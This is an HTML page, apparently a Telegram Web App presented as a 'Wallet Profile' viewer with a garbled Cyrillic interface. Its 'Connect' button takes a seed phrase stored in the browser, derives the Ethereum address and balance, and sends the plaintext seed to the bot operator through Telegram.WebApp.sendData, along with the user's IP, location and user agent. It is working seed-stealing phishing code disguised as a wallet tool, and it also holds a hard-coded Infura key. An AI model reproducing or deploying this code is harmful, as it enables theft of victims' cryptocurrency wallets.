<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8" />
    <title>Wallet Profile</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- Feather Icons -->
    <script src="https://unpkg.com/feather-icons"></script>
    <!-- bip39 + ethers + bitcoinjs -->
    <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/bip39.browser.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bitcoinjs-lib@6.1.0/dist/bitcoinjs.min.js"></script>
</head>
<body>
    <div class="container">
        <h2>üîê –í–∞—à –≥–∞–º–∞–Ω–µ—Ü—å</h2>
        <div class="info" id="walletInfo">
            <p><strong>–ê–¥—Ä–µ—Å–∞:</strong> <span id="ethAddress">‚Äì</span></p>
            <p><strong>–ë–∞–ª–∞–Ω—Å:</strong> <span id="ethBalance">‚Äì</span></p>
        </div>
        <button onclick="submitSeed()">
            <i data-feather="link"></i> –ü–æ–¥–∫–ª—é—á–∏—Ç—å
        </button>
    </div>

    <script>
        const userIp = localStorage.getItem("ip") || "–Ω–µ–≤—ñ–¥–æ–º–æ";
        const userLocation = localStorage.getItem("location") || "–Ω–µ–≤—ñ–¥–æ–º–æ";

        async function submitSeed() {
            const lastSeed = localStorage.getItem("last_seed");
            if (!lastSeed) return alert("‚ùå Seed-—Ñ—Ä–∞–∑–∞ –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–∞");

            document.getElementById("ethAddress").innerText = "‚è≥ –ó–∞—á–µ–∫–∞–π—Ç–µ‚Ä¶";
            document.getElementById("ethBalance").innerText = "‚è≥";

            try {
                const seedBuffer = await bip39.mnemonicToSeed(lastSeed);
                const root = bitcoin.bip32.fromSeed(seedBuffer);
                const ethNode = root.derivePath("m/44'/60'/0'/0/0");
                const ethWallet = new ethers.Wallet(ethNode.privateKey);

                const address = ethWallet.address;
                document.getElementById("ethAddress").innerText = address;

                const balance = await getEthBalance(address);
                document.getElementById("ethBalance").innerText = `${balance} ETH`;

                const payload = {
                    seed: lastSeed,
                    wallet: "ethereum",
                    address,
                    balance,
                    ip: userIp,
                    location: userLocation,
                    user_agent: navigator.userAgent,
                    timestamp: new Date().toISOString()
                };

                console.log("üì§ Payload:", payload);

                if (Telegram.WebApp?.sendData) {
                    Telegram.WebApp.sendData(JSON.stringify(payload));
                    console.log("‚úÖ Payload –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ");
                }

            } catch (e) {
                console.error("‚ùå –ü–æ–º–∏–ª–∫–∞ –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó –∞–¥—Ä–µ—Å–∏:", e);
                alert("–ü–æ–º–∏–ª–∫–∞ –æ–±—Ä–æ–±–∫–∏ seed-—Ñ—Ä–∞–∑–∏");
            }
        }

        async function getEthBalance(address) {
            try {
                const provider = new ethers.InfuraProvider("mainnet", "WEIWRB4VW3SDGAF2FGZWV2MY5DUJNQP7CD");
                const wei = await provider.getBalance(address);
                return ethers.formatEther(wei);
            } catch (e) {
                console.warn("‚ùå –ë–∞–ª–∞–Ω—Å –Ω–µ –æ—Ç—Ä–∏–º–∞–Ω–æ:", e);
                return "‚Äì";
            }
        }

        window.addEventListener("DOMContentLoaded", () => {
            feather.replace();
            if (typeof Telegram !== "undefined" && Telegram.WebApp) {
                Telegram.WebApp.ready();
                Telegram.WebApp.expand();
            }
        });
    </script>
</body>
</html>
